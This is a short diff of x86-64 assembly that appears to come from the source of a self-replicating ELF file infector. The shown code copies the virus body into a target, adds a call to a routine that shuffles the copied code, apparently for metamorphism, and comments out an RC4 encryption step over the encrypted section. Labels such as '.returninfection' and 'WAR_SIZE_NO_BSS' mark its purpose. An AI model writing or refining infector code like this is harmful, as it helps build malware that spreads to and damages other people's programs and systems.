@@ -253,7 +253,6 @@
 	cmp rax, -4095
 	jae .returninfection
 	mov rbx, rax
-
 	mov rdi, rbx
 
 
@@ -263,6 +262,40 @@
 
 	mov rcx, WAR_SIZE_NO_BSS
 	rep movsb
+
+
+
+
+
+	;lea	rax, [rel start_shuffle]
+	mov		rdi, [rbp + 48]
+	mov		rsi, [rbp + 56]
+	mov		rcx, [rbp + 8]
+	;lea rcx, [rel _start]
+
+
+
+	sub		rdi, rcx
+	sub		rsi, rcx
+
+	add		rdi, rbx
+	add		rsi, rbx
+
+
+	call	shuffle
+
+
+
+	;lea	rax, [rel end_shuffle]
+
+
+
+
+	;call	shuffle
+
+
+
+
 
 	mov rdi, rbx
 	mov		rax, [rbp + 24]
@@ -277,16 +310,15 @@
 	; RC4
 	mov		rdx, [rbp + 16]
 	;lea rdx, [rel _stop]
-
 	mov		rcx, [rbp + 24]
 	;lea rcx, [rel _encrypted_start]
 	sub rdx, rcx
 	mov rsi, rdx
 	xor rdx, rdx
-	call		[rbp]
+	;call		[rbp]
 
 
-	mov rdi, r14
+	mov		rdi, r14
 	mov		rax, [rbp + 16]
 	add		rax, mydata.p_offset
 	add rdi, [rax]
